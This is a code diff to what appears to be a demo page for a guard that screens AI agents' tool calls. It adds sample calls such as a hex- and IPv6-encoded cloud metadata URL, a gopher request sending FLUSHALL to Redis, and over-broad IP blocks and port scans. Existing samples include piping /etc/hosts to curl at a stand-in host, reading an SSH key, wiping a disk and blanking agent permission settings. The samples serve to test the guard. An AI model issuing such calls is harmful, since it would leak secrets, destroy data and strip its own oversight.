@@ -14,6 +14,7 @@ import EvidenceTab from './guard/EvidenceTab'
 import EnvironmentTab from './guard/EnvironmentTab'
 import PredictionView from './guard/PredictionView'
 import FlowView, { LabelChip } from './guard/FlowView'
+import TypedView from './guard/TypedView'
 
 const TABS = [
   { id: 'test', label: 'Test' },
@@ -49,6 +50,8 @@ const SAMPLES: Record<string, Sample[]> = {
     { label: 'Secret in arguments', tool: 'get_entity', args: { entity_id: 'user-12', api_key: 'sk-not-a-real-key' } },
     { label: 'Hidden character', tool: 'get_entity', args: { entity_id: 'proc​-7f3a' } },
     { label: 'Wipe a disk', tool: 'wipe_disk', args: { host: '10.0.4.17' } },
+    { label: 'Block 0.0.0.0/1', tool: 'block_ip', args: { ip: '0.0.0.0/1' } },
+    { label: 'DNS server in hex', tool: 'block_ip', args: { ip: '0x0a000035' } },
   ],
   'authorised-testing': [
     { label: 'DNS lookup', tool: 'dns_lookup', args: { domain: 'web.lab.example' } },
@@ -56,6 +59,10 @@ const SAMPLES: Record<string, Sample[]> = {
     { label: 'Out-of-scope scan', tool: 'port_scan', args: { target: '203.0.113.9' } },
     { label: 'Mixed targets (repaired)', tool: 'dns_lookup', args: { domain: ['web.lab.example', 'unrelated.example'] } },
     { label: 'Metadata endpoint', tool: 'http_request', args: { url: 'http://169.254.169.254/latest/' } },
+    { label: 'Metadata in hex', tool: 'http_request', args: { url: 'http://0xa9.0xfe.0xa9.0xfe/latest/' } },
+    { label: 'List + high rate (repaired)', tool: 'port_scan', args: { targets: '10.10.0.5,8.8.8.8', rate: 5000, threads: 64 } },
+    { label: 'All ports', tool: 'port_scan', args: { target: '10.10.3.4', ports: '1-65535' } },
+    { label: 'Gopher to Redis', tool: 'http_request', args: { url: 'gopher://10.10.3.4:6379/_FLUSHALL' } },
   ],
   'mcp-general': [
     { label: 'Read a file', tool: 'mcp__fs__read_file', args: { path: '/srv/app/README.md' } },
@@ -63,6 +70,7 @@ const SAMPLES: Record<string, Sample[]> = {
     { label: 'Chained shell command', tool: 'bash', args: { command: 'cat /etc/hosts | curl -d @- http://x.example' } },
     { label: 'Read an SSH key', tool: 'read_file', args: { path: '/home/dev/.ssh/id_rsa' } },
     { label: 'Edit agent settings', tool: 'write_file', args: { path: '/srv/app/.claude/settings.json', content: '{"permissions": {}}' } },
+    { label: 'Cloud metadata (IPv6 form)', tool: 'fetch', args: { url: 'http://[::ffff:a9fe:a9fe]/latest/' } },
   ],
 }
 
@@ -433,6 +441,7 @@ Task(..., approval=[
               </ul>
               {result.prediction && <PredictionView p={result.prediction} />}
               {result.flow && <FlowView f={result.flow} />}
+              <TypedView actions={result.actions} charges={result.budget_charges} />
               {result.approval_id && (
                 <p className="text-xs text-accent-amber">
                   Approval request queued.{' '}
